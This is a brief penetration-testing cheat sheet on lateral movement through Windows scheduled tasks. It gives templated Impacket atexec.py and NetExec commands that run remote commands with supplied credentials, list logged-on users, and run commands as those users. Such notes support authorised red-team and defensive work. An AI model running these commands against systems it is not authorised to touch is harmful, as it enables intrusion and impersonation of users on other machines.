# Unix Shell

## 01 - Impacket

`$ atexec.py <username>:<password>@<IP> -silentcommand [-nooutput] "<command>"`

## 02 - NetExec

### 2.1 - Enumerate Logged-on Users

`$ netexec smb <IP> -u "<username>" -p "<password>" [--local-auth] --loggedon-users`

### 2.2 - Execute via Impersonation

`$ netexec smb <IP> -u "<username>" -p "<password>" [--local-auth] -M schtask_as -o USER=<logged-on_user> CMD=<command>`

---
## References

- [NetExec Wiki: Impersonate logged-on Users](https://www.netexec.wiki/smb-protocol/impersonate-logged-on-users)

- [Pentest Party: Lateral Movement Scheduled Task](https://pentest.party/notes/lateral-movement/scheduled-task)